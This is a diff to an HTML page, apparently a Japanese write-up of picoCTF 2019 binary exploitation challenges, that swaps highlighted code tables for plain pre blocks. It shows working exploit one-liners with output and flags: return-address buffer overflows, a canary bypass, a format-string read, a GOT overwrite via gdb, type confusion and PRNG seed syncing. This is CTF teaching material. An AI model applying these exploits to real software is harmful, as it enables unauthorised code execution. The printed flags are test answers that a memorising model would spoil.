@@ -48,7 +48,7 @@
 <meta itemprop="description" content="URL: https://2019game.picoctf.com/ 2週間、お疲れ様です。 最終結果は、こんな感じ。 イベント終了時点で、ユーザは4万人弱でした。 PwnとWeb系があんまりできてないけど、スコ">
 <meta itemprop="datePublished" content="2019-10-12T07:45:00&#43;09:00" />
 <meta itemprop="dateModified" content="2019-10-13T10:30:00&#43;09:00" />
-<meta itemprop="wordCount" content="2580">
+<meta itemprop="wordCount" content="2480">
 
 
 
@@ -285,21 +285,13 @@ Hint: Make sure your address is in Little Endian.</p>
 <p><br /></p>
 <h3 id="solution-1">Solution</h3>
 <p>offsetを求めて、飛びたい関数に飛ぶだけ。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ (python -c &#39;print(&#34;A&#34;*76+&#34;\xE6\x85\x04\x08&#34;)&#39; ; cat - ) | ./vuln
+<pre>
+$ (python -c 'print("A"*76+"\xE6\x85\x04\x08")' ; cat - ) | ./vuln
 Give me a string and lets see what happens: 
 Woah, were jumping to 0x80485e6 !
 picoCTF{n0w_w3r3_ChaNg1ng_r3tURn57f5688e7}
-</code></pre></td></tr></table>
-</div>
-</div><p>Flag: <code>picoCTF{n0w_w3r3_ChaNg1ng_r3tURn57f5688e7}</code></p>
+</pre>
+<p>Flag: <code>picoCTF{n0w_w3r3_ChaNg1ng_r3tURn57f5688e7}</code></p>
 <p><br /><br />
 <br /><br /></p>
 <h2 id="binary-exploitation-newoverflow-1-200-points">[Binary Exploitation]: NewOverFlow-1 (200 points)</h2>
@@ -398,21 +390,13 @@ Hint: GDB can print the stack after you send arguments</p>
 <p><br /></p>
 <h3 id="solution-4">Solution</h3>
 <p>これはpicoCTF 2018のbof2とほぼ同じです。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ (python -c &#39;print(&#34;A&#34;*188+&#34;\xe6\x85\x04\x08&#34;+&#34;BBBB&#34;+&#34;\xEF\xBE\xAD\xDE&#34;+&#34;\x0D\xD0\xDE\xC0&#34;)&#39;; cat -) | ./vuln
+<pre>
+$ (python -c 'print("A"*188+"\xe6\x85\x04\x08"+"BBBB"+"\xEF\xBE\xAD\xDE"+"\x0D\xD0\xDE\xC0")'; cat -) | ./vuln
 Please enter your string: 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBﾭ?
 picoCTF{arg5_and_r3turn55897b905}
-</code></pre></td></tr></table>
-</div>
-</div><p>Flag: <code>picoCTF{arg5_and_r3turn55897b905}</code></p>
+</pre>
+<p>Flag: <code>picoCTF{arg5_and_r3turn55897b905}</code></p>
 <p><br /><br />
 <br /><br /></p>
 <h2 id="binary-exploitation-canary-300-points">[Binary Exploitation]: CanaRy (300 points)</h2>
@@ -432,21 +416,13 @@ Hint: Maybe there&rsquo;s a smart way to brute-force the canary?</p>
 <h3 id="solution-5">Solution</h3>
 <p>これはpicoCTF 2018のbof3とほぼ同じです。</p>
 <p>去年のどこかのWriteupにあったコードを流用させてもらって、canary (33xO) をゲット。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ (python -c &#39;print(&#34;54\n&#34;+&#34;A&#34;*32+&#34;33xO&#34;+&#34;abcdefghijklmnop&#34; + &#34;\xed\x07&#34;)&#39;; cat -) | ./vuln
+<pre>
+$ (python -c 'print("54\n"+"A"*32+"33xO"+"abcdefghijklmnop" + "\xed\x07")'; cat -) | ./vuln
 Please enter the length of the entry:
-&gt; Input&gt; Ok... Now Where&#39;s the Flag?
+> Input> Ok... Now Where's the Flag?
 picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}
-</code></pre></td></tr></table>
-</div>
-</div><p>Flag: <code>picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}</code></p>
+</pre>
+<p>Flag: <code>picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}</code></p>
 <p><br /><br />
 <br /><br /></p>
 <h2 id="binary-exploitation-messy-malloc-300-points">[Binary Exploitation]: messy-malloc (300 points)</h2>
@@ -649,20 +625,8 @@ Hint: <a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/For
 </div>
 </div><p><br />
 37番目に出てくるので、%37$s 入れるだけでもフラグは取れます。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./vuln 
+<pre>
+$ ./vuln 
 input whatever string you want; then it will be printed back:
 
 %37$s
@@ -671,9 +635,8 @@ your input
 will be printed:
 
 picoCTF{str1nG_CH3353_159c98a8}
-</code></pre></td></tr></table>
-</div>
-</div><p>Flag: <code>picoCTF{str1nG_CH3353_159c98a8}</code></p>
+</pre>
+<p>Flag: <code>picoCTF{str1nG_CH3353_159c98a8}</code></p>
 <p><br /><br />
 <br /><br /></p>
 <h2 id="binary-exploitation-got-350-points">[Binary Exploitation]: GoT (350 points)</h2>
@@ -689,82 +652,38 @@ picoCTF{str1nG_CH3353_159c98a8}
 <li>vuln.c</li>
 </ul>
 <p><br /></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ checksec vuln
+<pre>
+$ checksec vuln
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
-    PIE:      No PIE (0x8048000)   &lt;---
-</code></pre></td></tr></table>
-</div>
-</div><p><br /></p>
+    PIE:      No PIE (0x8048000)   <---
+</pre>
+<p><br /></p>
 <h3 id="solution-8">Solution</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">gef➤  x win
-0x80485c6 &lt;win&gt;:	0x53e58955
+<pre>
+gef➤  x win
+0x80485c6 <win>:	0x53e58955
 
 gef➤  disas main
 :
 (snip)
 :
-   0x080486f8 &lt;+153&gt;:	push   0x0
-   0x080486fa &lt;+155&gt;:	call   0x8048460 &lt;exit@plt&gt;
+   0x080486f8 <+153>:	push   0x0
+   0x080486fa <+155>:	call   0x8048460 <exit@plt>
 
 gef➤  disas 0x8048460
 Dump of assembler code for function exit@plt:
-   0x08048460 &lt;+0&gt;:	jmp    DWORD PTR ds:0x804a01c
-   0x08048466 &lt;+6&gt;:	push   0x20
-   0x0804846b &lt;+11&gt;:	jmp    0x8048410
-</code></pre></td></tr></table>
-</div>
-</div><p>0x804a01cを、0x80485c6 (win)に書き換えればOK。</p>
+   0x08048460 <+0>:	jmp    DWORD PTR ds:0x804a01c
+   0x08048466 <+6>:	push   0x20
+   0x0804846b <+11>:	jmp    0x8048410
+</pre>
+<p>0x804a01cを、0x80485c6 (win)に書き換えればOK。</p>
 <p><br />
 10進数で入力します。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./vuln 
+<pre>
+$ ./vuln 
 You can just overwrite an address, what can you do?
 
 Input address
@@ -776,9 +695,8 @@ Input value?
 The following line should print the flag
 
 picoCTF{A_s0ng_0f_1C3_and_f1r3_db12a9ed}
-</code></pre></td></tr></table>
-</div>
-</div><p>Flag: <code>picoCTF{A_s0ng_0f_1C3_and_f1r3_db12a9ed}</code></p>
+</pre>
+<p>Flag: <code>picoCTF{A_s0ng_0f_1C3_and_f1r3_db12a9ed}</code></p>
 <p><br /><br />
 <br /><br /></p>
 <h2 id="binary-exploitation-pointy-350-points">[Binary Exploitation]: pointy (350 points)</h2>
@@ -823,36 +741,8 @@ Hint : A function pointer can be used to call any function</p>
 </div>
 </div><p>ProfessorのlastScoreにアドレスを入れて、Student構造体としてアクセスさせます。</p>
 <p><br /></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./vuln 
+<pre>
+$ ./vuln 
 Input the name of a student
 aaa
 Input the name of the favorite professor of a student 
@@ -877,9 +767,8 @@ ccc
 Input the score: 
 100
 picoCTF{g1v1ng_d1R3Ct10n5_d9be6a30}
-</code></pre></td></tr></table>
-</div>
-</div><p>Flag: <code>picoCTF{g1v1ng_d1R3Ct10n5_d9be6a30}</code></p>
+</pre>
+<p>Flag: <code>picoCTF{g1v1ng_d1R3Ct10n5_d9be6a30}</code></p>
 <p><br /><br />
 <br /><br /></p>
 <h2 id="binary-exploitation-seed-spring-350-points">[Binary Exploitation]: seed-sPRiNG (350 points)</h2>
@@ -898,34 +787,14 @@ You and the program should sync up!<br /></p>
 </ul>
 <p><br />
 実行例：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback"># ./seed_spring 
+<pre>
+# ./seed_spring 
                                                                              
-                          #                mmmmm  mmmmm    &#34;    mm   m   mmm 
-  mmm    mmm    mmm    mmm#          mmm   #   &#34;# #   &#34;# mmm    #&#34;m  # m&#34;   &#34;
- #   &#34;  #&#34;  #  #&#34;  #  #&#34; &#34;#         #   &#34;  #mmm#&#34; #mmmm&#34;   #    # #m # #   mm
-  &#34;&#34;&#34;m  #&#34;&#34;&#34;&#34;  #&#34;&#34;&#34;&#34;  #   #          &#34;&#34;&#34;m  #      #   &#34;m   #    #  # # #    #
- &#34;mmm&#34;  &#34;#mm&#34;  &#34;#mm&#34;  &#34;#m##         &#34;mmm&#34;  #      #    &#34; mm#mm  #   ##  &#34;mmm&#34;
+                          #                mmmmm  mmmmm    "    mm   m   mmm 
+  mmm    mmm    mmm    mmm#          mmm   #   "# #   "# mmm    #"m  # m"   "
+ #   "  #"  #  #"  #  #" "#         #   "  #mmm#" #mmmm"   #    # #m # #   mm
+  """m  #""""  #""""  #   #          """m  #      #   "m   #    #  # # #    #
+ "mmm"  "#mm"  "#mm"  "#m##         "mmm"  #      #    " mm#mm  #   ##  "mmm"
                                                                              
 
 
@@ -936,9 +805,8 @@ LEVEL (1/30)
 
 Guess the height: 2
 WRONG! Sorry, better luck next time!
-</code></pre></td></tr></table>
-</div>
-</div><p><br /></p>
+</pre>
+<p><br /></p>
 <h3 id="solution-10">Solution</h3>
 <p>ランダムのシードをどこから取っているか、GDBとかGhidraとかで確認します。</p>
 <p>現在時間をベースにしているようです。</p>
@@ -996,15 +864,11 @@ WRONG! Sorry, better luck next time!
 </code></pre></td></tr></table>
 </div>
 </div><p>時間を合わせないといけないので、Shell server上で以下のように実行します。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./seed_spring_solve.o ; nc 2019shell1.picoctf.com 12269
-</code></pre></td></tr></table>
-</div>
-</div><p>あとは出てきた値を1つずつ入れるだけです。</p>
+<pre>
+$ ./seed_spring_solve.o ; nc 2019shell1.picoctf.com 12269
+</pre>
+<p>あとは出てきた値を1つずつ入れるだけです。</p>
+<br>
 <p>Flag: <code>picoCTF{pseudo_random_number_generator_not_so_random_66aacad47c332de30eb8d8170d96b772}</code></p>
 <p><br /><br />
 <br /><br /></p>
